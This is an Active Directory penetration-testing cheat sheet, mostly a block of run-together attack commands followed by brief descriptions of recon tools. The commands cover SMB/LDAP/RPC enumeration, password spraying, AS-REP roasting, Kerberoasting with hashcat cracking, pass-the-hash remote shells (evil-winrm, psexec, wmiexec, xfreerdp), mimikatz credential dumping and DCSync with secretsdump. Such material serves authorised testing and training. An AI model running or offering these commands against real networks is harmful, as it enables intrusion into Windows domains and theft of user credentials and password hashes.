```
nmap -sS -A -T4 -p- -Pn -oA full [IP]nmap -sS -sV -sC -p- -Pn -oA full [IP]rustscan -b 5000 -t 2000 --ulimit 5000 [IP] #optionally: -- [nmap flags]cme smb [IP] -u '' -p '' --shares --pass-polcme smb [IP] -u '' -p '' -X 'whoami'cme winrm [IP] -u '' -p ''smbclient -L \\\\[IP]\\smbclient \\\\[IP]\\[Share name]rpcclient -U '' [IP] #optionally: -N (do not ask for a password)ldapsearch -x -h [IP] -s base namingcontextsldapsearch -x -h [IP] -s sub -b 'DC=,DC=' > outputfile.txt#Creating a list of valid usernames retrieved from RPC:cat users.txt | awk -F\[ '{print $2}' | awk -F \] '{print $1}' > valid_users.txt#Password spraying:./kerbrute passwordspray -d [DN] --dc [DN/IP] users.txt passwordcme smb [IP] -u users.txt -p passwords.txt #optionally: --shares --pass-pol#AS-REP roast:GetNPUsers.py -dc-ip [DC IP] [DN]/[username] -no-pass hashcat.exe -m 18200 hash.txt rockyou.txt -O#Kerberoasting:GetUserSPNs.py [DN]/[username]:[password] -requestrubeus.exe kerberoast /creduser:[DN]\[username] /credpassword:[user's password] /outfile:[outfile] /format:[hashcat/john]hashcat.exe -m 13100 hash.txt rockyou.txt -O#Accessing the box:./evil-winrm.rb -i [DN/IP] -u [username] -p '[password]'./evil-winrm.rb -i [DN/IP] -u [username] -H [HASH]psexec.py -hashes [hash] [DN]/[username]@[IP]smbexec.py -hashes [hash] [DN]/[username]@[IP]wmiexec.py -hashes [hash] [DN]/[username]@[IP]psexec.py [DN]/[username]:[password]@[IP]smbexec.py [DN]/[username]:[password]@[IP]wmiexec.py [DN]/[username]:[password]@[IP]xfreerdp /u:[username] /p:[password] /v:[IP]xfreerdp /u:[username] /pth:[NT hash] /v:[IP]pth-winexe -U [DN]/[username]%[hash] //[IP] cmd#Authentication through a SSL connection:./evil-winrm.rb -S -i [DN/IP] -u [username] -p '[password]' -c [certificate file] -k [private key]#Dumping password hashes/credentials:mimikatz.exe
privilege::debug
token::elevate
lsadump::sam #or lsadump::lsa
sekurlsa::logonPasswords #to obtain credentials of currently logged users#DCSync:secretsdump.py [DN]/[username]:[password]@[DN] -dc-ip [IP] #Cracking NTLM and NTLMv2 hashes with Hashcat:#NTLM:hashcat.exe -m 1000 hash.txt wordlist.txt#NTLMv2:hashcat.exe -m 5600 hash.txt wordlist.txt
```



Useful recon tools and their description:

LDAPsearch — is a command line utility and a shell-accessible interface, which bases on ldap_search_ext(3) library call. The tool maintains a connection to the server using Lightweight Directory Access Protocol and — using specified parameters — performs querying LDAP service on our behalf¹.

RPCclient — is an utility which was created to test Microsoft Remote Procedure Call functionality in SMB/Samba. Is can be used to perform execution of client-side MS-RPC functions².

SMBclient — is an utility which can be used to access SMB/CIFS shares. It is able to communicate with SMB/CIFS servers and interact with their shares.

SMBmap — another tool which allows to access SMB shares. It allows to enumerate share drives, drive permissions and share contents. SMBmap provides also upload/download functionality.

CrackMapExec — is a tool which abuses built-in features of Active Directory. Allows us to assess the security of a Domain using its various features.

